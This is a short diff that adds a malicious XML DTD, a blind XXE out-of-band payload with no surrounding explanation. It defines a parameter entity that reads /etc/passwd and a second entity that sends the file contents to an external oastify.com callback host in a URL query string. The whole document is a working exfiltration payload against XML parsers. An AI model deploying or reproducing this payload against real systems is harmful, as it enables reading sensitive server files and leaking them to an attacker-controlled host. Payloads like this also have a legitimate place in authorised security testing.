@@ -1,0 +1,3 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'https://j0kha5q6zu06d1bul6ku74kp4ga7y3ms.oastify.com/?data=%data;'>">
+%exfil;
